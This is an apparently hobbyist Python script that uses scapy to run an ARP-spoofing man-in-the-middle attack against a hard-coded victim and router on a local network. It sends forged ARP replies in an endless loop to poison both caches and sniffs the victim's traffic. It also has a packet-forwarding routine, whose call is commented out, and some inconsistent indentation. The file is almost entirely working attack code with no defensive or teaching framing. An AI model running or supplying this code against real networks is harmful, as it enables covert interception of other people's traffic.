import scapy.all as scapy
import threading
import time
#from omer import *

#@timed
#@writen(functionName="find_mac")
def find_mac(ip):
    mac = None
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    response = str(answered_list).split("Other:")[1].replace(">", "")

    if response != '0':
        mac = answered_list[0][1].hwsrc

    return mac


my_ip = "10.0.0.8"
target_ip = "10.0.0.5"
router_ip = "10.0.0.138"

my_mac = "d4:be:d9:73:e3:bb"#find_mac(my_ip)
print(my_mac) 
target_mac = find_mac(target_ip)
print(target_mac) 
router_mac = find_mac(router_ip)
print(router_mac) 

#@timed
#@writen(functionName="check_packet")
def check_packet(packet, start):
    try:
        src_ip = packet[0][scapy.IP].src
        dst_ip = packet[0][scapy.IP].dst
    except:
        src_ip = None
        dst_ip = None

    if (src_ip == target_ip or dst_ip == target_ip) and packet[0][scapy.Ether].dst == my_mac:        
	    print("------\nGot\n------")        # print("dst " + packet[0][scapy.Ether].dst)        print("src " + packet[0][scapy.Ether].src)
        
        
	  
        #threading.Thread(target=redirecect, args=(packet, start)).start()

#@timed
#@writen(functionName="spoof")
def spoof(victim_packet, router_packet):
    my = scapy.Ether(src=my_mac, dst=my_mac)
    mya = scapy.ARP(op=2, psrc=router_ip, pdst=target_ip,
                    hwdst=target_mac)
    while True:
        scapy.sendp(victim_packet, verbose=False)
        scapy.sendp(router_packet, verbose=False)
        time.sleep(2)

#@timed
#@writen(functionName="redirecect")
def redirecect(packet, start):
    src_ip = packet[0][scapy.IP].src

    if src_ip == target_ip:
        packet[0][scapy.Ether].dst = router_mac

    else:
        packet[0][scapy.Ether].dst = target_mac
    packet[0][scapy.Ether].src = my_mac
    '''print("******\nRedirected")
    print("dst " + packet[0][scapy.Ether].dst)
    print("src " + packet[0][scapy.Ether].src)
    print("******")'''
    
    del packet[0].chksum

    scapy.sendp(packet, verbose=False)  # ,verbose=False
    print(time.time() - start)



print("my " + my_mac)
print("target " + target_mac)
print("router " + router_mac)

victim_ether = scapy.Ether(src=router_mac, dst=target_mac)
victim_arp = scapy.ARP(op=2, psrc=router_ip, pdst=target_ip,
                       hwdst=target_mac)
router_ether = scapy.Ether(src=target_mac, dst=router_mac)
router_arp = scapy.ARP(op=2, psrc=target_ip, pdst=router_ip,
                       hwdst=router_mac)

victim_packet = victim_ether / victim_arp
router_packet = router_ether / router_arp

threading.Thread(target=spoof, args=(victim_packet, router_packet)).start()

while True:
    packet = scapy.sniff(count=1)
    start = time.time()
    threading.Thread(target=check_packet, args=(packet, start)).start()
